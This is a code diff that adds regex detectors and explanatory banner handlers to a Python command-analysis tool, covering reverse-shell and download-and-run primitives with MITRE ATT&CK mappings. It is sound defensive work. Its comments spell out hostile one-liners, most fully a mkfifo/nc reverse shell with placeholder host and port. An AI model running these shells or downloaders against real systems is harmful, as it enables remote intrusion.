@@ -2010,7 +2010,268 @@ def _handle_native_cmd_explainer(text: str) -> str:
     raise ValueError("no native-cmd rule matched")
 
 
+# ─── Feb 2026 · Reverse-Shell Primitives (batch-CSV gaps) ───────────────
+
+# X1. BASH_MKFIFO_REVERSE_SHELL — classic named-pipe reverse shell
+# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
+_BASH_MKFIFO_RS_RX = re.compile(
+    r"mkfifo\s+(?P<fifo>/\S+)"
+    r"[\s\S]{0,240}?"
+    # sh -i can be piped-to OR redirected-in:  cat FIFO|/bin/sh -i     or     /bin/sh -i < FIFO
+    r"(?:cat\s+(?P=fifo)\s*\|\s*)?(?:/bin/)?(?:sh|bash|zsh|dash)\s+-i"
+    r"[\s\S]{0,240}?"
+    # C2 endpoint: nc | ncat | openssl s_client
+    r"(?:\|\s*)?(?:nc(?:at|\.\w+)?|openssl\s+s_client)\s+"
+    r"(?:-\S+\s+)*"                                    # optional CLI flags
+    r"(?:-connect\s+)?"                                # openssl form
+    r"(?P<host>[\w.\-]+)[\s:]+(?P<port>\d{2,5})",
+    re.IGNORECASE,
+)
+
+def _bash_mkfifo_rs_matches(text: str) -> bool:
+    return bool(_BASH_MKFIFO_RS_RX.search(text))
+
+def _handle_bash_mkfifo_rs(text: str) -> str:
+    m = _BASH_MKFIFO_RS_RX.search(text)
+    if not m:
+        raise ValueError("no mkfifo-rs match")
+    banner = (
+        "──── BASH_MKFIFO_REVERSE_SHELL (Feb 2026) ────\n"
+        f"Named pipe   : {m.group('fifo')}\n"
+        f"Callback host: {m.group('host')}\n"
+        f"Callback port: {m.group('port')}\n"
+        "Behavior     : Interactive reverse shell via named-pipe I/O relay.\n"
+        "MITRE ATT&CK : T1059.004 (Unix Shell), T1071.001 (Application Layer),\n"
+        "               T1095 (Non-Application Layer), T1571 (Non-Standard Port)\n"
+    )
+    return f"{text}\n\n{banner}"
+
+
+# X2. PYTHON_SOCKET_REVERSE_SHELL — python -c '... socket.socket ... dup2 ... subprocess ...'
+_PY_SOCK_RS_RX = re.compile(
+    r"python\d?\s+-c\s+['\"]?[\s\S]{0,600}?"
+    r"socket\.socket\s*\(\s*(?:socket\.)?AF_INET"
+    r"[\s\S]{0,240}?"
+    r"\.connect\s*\(\s*\(?\s*['\"](?P<host>[\d.]+|[\w\-.]+)['\"]\s*,\s*(?P<port>\d{2,5})\s*\)?"
+    r"[\s\S]{0,240}?"
+    r"(?:dup2|pty\.spawn|subprocess)",
+    re.IGNORECASE,
+)
+
+def _py_sock_rs_matches(text: str) -> bool:
+    return bool(_PY_SOCK_RS_RX.search(text))
+
+def _handle_py_sock_rs(text: str) -> str:
+    m = _PY_SOCK_RS_RX.search(text)
+    if not m:
+        raise ValueError("no python-rs match")
+    banner = (
+        "──── PYTHON_SOCKET_REVERSE_SHELL (Feb 2026) ────\n"
+        f"Callback host: {m.group('host')}\n"
+        f"Callback port: {m.group('port')}\n"
+        "Behavior     : socket.socket + dup2/pty + subprocess = interactive reverse shell.\n"
+        "MITRE ATT&CK : T1059.006 (Python), T1071.001, T1095, T1571\n"
+    )
+    return f"{text}\n\n{banner}"
+
+
+# X3. PERL_SOCKET_REVERSE_SHELL — perl -MIO::Socket -e '$c=new IO::Socket::INET(PeerAddr,"H:P")...'
+_PERL_RS_RX = re.compile(
+    r"perl\s+(?:\S+\s+)*-e\s*['\"]?[\s\S]{0,400}?"
+    r"IO::Socket::INET\s*\("
+    r"[\s\S]{0,200}?"
+    r"PeerAddr\s*(?:,|=>)?\s*['\"]?(?P<host>[\w.\-]+):(?P<port>\d{2,5})",
+    re.IGNORECASE,
+)
+
+def _perl_rs_matches(text: str) -> bool:
+    return bool(_PERL_RS_RX.search(text))
+
+def _handle_perl_rs(text: str) -> str:
+    m = _PERL_RS_RX.search(text)
+    if not m:
+        raise ValueError("no perl-rs match")
+    banner = (
+        "──── PERL_SOCKET_REVERSE_SHELL (Feb 2026) ────\n"
+        f"Callback host: {m.group('host')}\n"
+        f"Callback port: {m.group('port')}\n"
+        "Behavior     : IO::Socket::INET one-liner reverse shell (classic Metasploit payload).\n"
+        "MITRE ATT&CK : T1059.006 (Perl-family), T1071.001, T1095, T1571\n"
+    )
+    return f"{text}\n\n{banner}"
+
+
+# X4. BASH_GLOB_OBFUSCATION — /???/b??h -c "w"'\"u"'w"'\"m"'i" → /bin/bash -c whoami
+_BASH_GLOB_RX = re.compile(
+    r"/\?{3,}/[a-z\?]{2,10}\s+-c\s+['\"]",
+    re.IGNORECASE,
+)
+
+def _bash_glob_matches(text: str) -> bool:
+    return bool(_BASH_GLOB_RX.search(text))
+
+def _handle_bash_glob(text: str) -> str:
+    m = _BASH_GLOB_RX.search(text)
+    if not m:
+        raise ValueError("no glob-obfusc match")
+    # Strip quote-inserted noise: 'x'"y"'z' → xyz
+    clean = re.sub(r"['\"]", "", text)
+    # Then resolve /???/b??h → /bin/bash
+    clean = re.sub(r"/\?{3,}/b\?{2,}h", "/bin/bash", clean)
+    clean = re.sub(r"/\?{3,}/s\?{1,}", "/bin/sh", clean)
+    banner = (
+        "──── BASH_GLOB_OBFUSCATION (Feb 2026) ────\n"
+        "Shell path was obfuscated via character-class globbing (?/*) so\n"
+        "AWL / string-match tools cannot flag 'bash' or 'sh' by name.\n"
+        "MITRE ATT&CK : T1027.010 (Command Obfuscation), T1059.004 (Unix Shell)\n\n"
+        f"Deobfuscated : {clean}\n"
+    )
+    return f"{text}\n\n{banner}"
+
+
+# X5. BASH_WGET_FLOCK_BACKGROUND — wget URL | flock ... | bash &
+_BASH_WGET_FLOCK_RX = re.compile(
+    r"(?:wget|curl)\s+(?:\S+\s+)*(?P<url>https?://\S+)"
+    r"[\s\S]{0,160}?"
+    r"(?:flock\s+\S+\s+\S+\s+)?"
+    r"(?:sh|bash|zsh|dash)(?:\s*(?:$|&|\||;)|\s*-c)",
+    re.IGNORECASE,
+)
+
+def _bash_wget_flock_matches(text: str) -> bool:
+    return bool(_BASH_WGET_FLOCK_RX.search(text))
+
+def _handle_bash_wget_flock(text: str) -> str:
+    m = _BASH_WGET_FLOCK_RX.search(text)
+    if not m:
+        raise ValueError("no wget-flock match")
+    banner = (
+        "──── BASH_WGET_FLOCK_BACKGROUND (Feb 2026) ────\n"
+        f"Download URL : {m.group('url')}\n"
+        "Behavior     : wget → shell pipe, backgrounded, often flock-guarded\n"
+        "               to prevent parallel-run collisions (botnet hallmark).\n"
+        "MITRE ATT&CK : T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell),\n"
+        "               T1027 (Obfuscated Files)\n"
+    )
+    return f"{text}\n\n{banner}"
+
+
+# X6. BASH_DEV_TCP_EXFIL — /dev/tcp/<host>/<port> redirection (row-07)
+_BASH_DEV_TCP_RX = re.compile(
+    r"(?:>\s*|<\s*|>&\s*|<&\s*|exec\s+\d*<>\s*)?/dev/(?:tcp|udp)/(?P<host>[\d.]+|[\w\-.]+)/(?P<port>\d{2,5})",
+    re.IGNORECASE,
+)
+
+def _bash_dev_tcp_matches(text: str) -> bool:
+    return bool(_BASH_DEV_TCP_RX.search(text))
+
+def _handle_bash_dev_tcp(text: str) -> str:
+    m = _BASH_DEV_TCP_RX.search(text)
+    if not m:
+        raise ValueError("no /dev/tcp match")
+    banner = (
+        "──── BASH_DEV_TCP_EXFIL (Feb 2026) ────\n"
+        f"Callback host: {m.group('host')}\n"
+        f"Callback port: {m.group('port')}\n"
+        "Behavior     : bash's /dev/tcp pseudo-device — file-descriptor-driven\n"
+        "               network I/O. Used for reverse shells AND raw exfil.\n"
+        "MITRE ATT&CK : T1059.004 (Unix Shell), T1041 (Exfil over C2), T1571\n"
+    )
+    return f"{text}\n\n{banner}"
+
+
+# X7. Bash_base32_pipe_shell — echo "..." | base32 -d | sh (row-10 variant)
+_BASH_B32_PIPE_RX = re.compile(
+    r"echo\s+['\"]?(?P<blob>[A-Z2-7=]{8,})['\"]?"
+    r"\s*\|\s*base32\s+-d\s*\|\s*(?:sh|bash|dash|zsh)",
+    re.IGNORECASE,
+)
+
+def _bash_b32_pipe_matches(text: str) -> bool:
+    return bool(_BASH_B32_PIPE_RX.search(text))
+
+def _handle_bash_b32_pipe(text: str) -> str:
+    import base64 as _b64
+    m = _BASH_B32_PIPE_RX.search(text)
+    if not m:
+        raise ValueError("no base32-pipe-shell")
+    blob = m.group("blob").upper()
+    # base32 needs padding to multiple of 8
+    if len(blob) % 8 != 0:
+        blob = blob + "=" * (8 - len(blob) % 8)
+    try:
+        decoded = _b64.b32decode(blob, casefold=True).decode("utf-8", errors="replace")
+    except Exception as e:
+        decoded = f"[base32 decode failed: {e}]"
+    banner = (
+        "──── Bash_base32_pipe_shell (Feb 2026) ────\n"
+        f"Base32 blob : {blob}\n"
+        f"Decoded     : {decoded}\n"
+        "Behavior    : Bash pipe: base32-decode then exec via sh (less common\n"
+        "              than base64 → common EDR-evasion trick).\n"
+        "MITRE       : T1027 / T1140 / T1059.004\n"
+    )
+    return f"{text}\n\n{banner}"
+
+
 ARCHETYPES: List[Dict[str, Any]] = [
+    # ─── Feb 2026 · Reverse-Shell Primitives (batch-CSV row 3/4/5/6/8/9 fix) ─
+    {
+        "id": "BASH_MKFIFO_REVERSE_SHELL",
+        "description": "Named-pipe reverse shell (mkfifo + cat + sh -i + nc).",
+        "chain": ["reverse-shell-mkfifo"],
+        "handler": _handle_bash_mkfifo_rs,
+        "match":   lambda t: _bash_mkfifo_rs_matches(t),
+        "terminal": True,
+    },
+    {
+        "id": "PYTHON_SOCKET_REVERSE_SHELL",
+        "description": "Python one-liner reverse shell (socket + dup2 + subprocess).",
+        "chain": ["reverse-shell-python"],
+        "handler": _handle_py_sock_rs,
+        "match":   lambda t: _py_sock_rs_matches(t),
+        "terminal": True,
+    },
+    {
+        "id": "PERL_SOCKET_REVERSE_SHELL",
+        "description": "Perl one-liner reverse shell (IO::Socket::INET).",
+        "chain": ["reverse-shell-perl"],
+        "handler": _handle_perl_rs,
+        "match":   lambda t: _perl_rs_matches(t),
+        "terminal": True,
+    },
+    {
+        "id": "BASH_GLOB_OBFUSCATION",
+        "description": "Bash `/???/b??h -c` character-class glob shell-path obfuscation.",
+        "chain": ["glob-resolve"],
+        "handler": _handle_bash_glob,
+        "match":   lambda t: _bash_glob_matches(t),
+        "terminal": True,
+    },
+    {
+        "id": "BASH_WGET_FLOCK_BACKGROUND",
+        "description": "`wget URL | (flock) | bash &` backgrounded downloader (botnet hallmark).",
+        "chain": ["download-shell-bg"],
+        "handler": _handle_bash_wget_flock,
+        "match":   lambda t: _bash_wget_flock_matches(t),
+        "terminal": True,
+    },
+    {
+        "id": "BASH_DEV_TCP_EXFIL",
+        "description": "bash /dev/tcp/host/port pseudo-device (reverse shell / raw exfil).",
+        "chain": ["dev-tcp-annotate"],
+        "handler": _handle_bash_dev_tcp,
+        "match":   lambda t: _bash_dev_tcp_matches(t),
+        "terminal": True,
+    },
+    {
+        "id": "Bash_base32_pipe_shell",
+        "description": "echo '<base32>' | base32 -d | sh (row-10 variant).",
+        "chain": ["extract-b32", "base32-decode"],
+        "handler": _handle_bash_b32_pipe,
+        "match":   lambda t: _bash_b32_pipe_matches(t),
+        "terminal": True,
+    },
     {
         "id": "BASH_HEX_ECHO_XXD",
         "description": "Bash echo <hex> | xxd -r -p — hex-encoded IOC / reverse-shell target",
